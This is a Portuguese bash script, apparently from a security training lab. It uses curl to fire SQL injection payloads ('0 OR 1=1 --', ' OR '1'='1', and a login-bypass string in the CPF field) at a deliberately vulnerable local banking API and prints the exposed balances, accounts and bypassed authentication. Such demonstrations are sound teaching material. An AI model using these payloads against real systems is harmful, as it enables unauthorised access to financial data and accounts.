#!/bin/bash

# Script para demonstrar SQL Injection
# APENAS PARA FINS EDUCATIVOS

echo "========================================"
echo "   VULNERABILIDADE: SQL INJECTION"
echo "========================================"
echo

BASE_URL="http://localhost:8080"

echo "DEMONSTRAÇÃO: SQL INJECTION"
echo "Explorando injeção SQL em endpoints bancários vulneráveis"
echo


# 1. SQL Injection - Busca por saldo
echo "1. SQL Injection - Extraindo todos os saldos"
echo "---------------------------------------------"
echo "Endpoint: /api/vulneravel/sql-injection-saldo/{valor}"
echo "Payload: 0 OR 1=1 --"
echo "Descrição: Bypassa a condição WHERE para retornar todos os registros"
echo
echo "Comando:"
echo "curl -s '$BASE_URL/api/vulneravel/sql-injection-saldo/0%20OR%201=1%20--'"
echo
echo "Resposta:"
curl -s "$BASE_URL/api/vulneravel/sql-injection-saldo/0%20OR%201=1%20--" | jq . 2>/dev/null || echo "AVISO: Aplicação não está rodando ou erro no JSON"
echo
echo "IMPACTO: Todos os saldos bancários foram expostos!"
echo


# 2. SQL Injection - Busca por número de conta
echo "2. SQL Injection - Extraindo todas as contas"
echo "----------------------------------------------"
echo "Endpoint: /api/vulneravel/sql-injection-conta/{numeroConta}"
echo "Payload: ' OR '1'='1"
echo "Descrição: Quebra a query SQL para retornar todos os registros"
echo
echo "Comando:"
echo "curl -s '$BASE_URL/api/vulneravel/sql-injection-conta/%27%20OR%20%271%27=%271'"
echo
echo "Resposta:"
curl -s "$BASE_URL/api/vulneravel/sql-injection-conta/%27%20OR%20%271%27=%271" | jq . 2>/dev/null || echo "AVISO: Aplicação não está rodando ou erro no JSON"
echo
echo "IMPACTO: Todas as contas bancárias foram expostas!"
echo


# 3. SQL Injection - Login bypass
echo "3. SQL Injection - Bypass de autenticação"
echo "------------------------------------------"
echo "Endpoint: POST /api/vulneravel/sql-injection-login"
echo "Payload CPF: ' OR '1'='1' --"
echo "Descrição: Bypassa verificação de credenciais"
echo
echo "Comando:"
echo "curl -X POST '$BASE_URL/api/vulneravel/sql-injection-login' -H 'Content-Type: application/json' -d '{\"cpf\":\"'\''OR'\''1'\''='\''1'\''--\",\"senha\":\"qualquer\"}'"
echo
echo "Resposta:"
curl -s -X POST "$BASE_URL/api/vulneravel/sql-injection-login" \
  -H "Content-Type: application/json" \
  -d '{"cpf":"'\''OR'\''1'\''='\''1'\''--","senha":"qualquer"}' | jq . 2>/dev/null || echo "AVISO: Erro na requisição"
echo
echo "IMPACTO: Autenticação bypassada!"
echo



echo "========================================"
echo "  SQL INJECTION - DEMONSTRAÇÃO COMPLETA"
echo "========================================"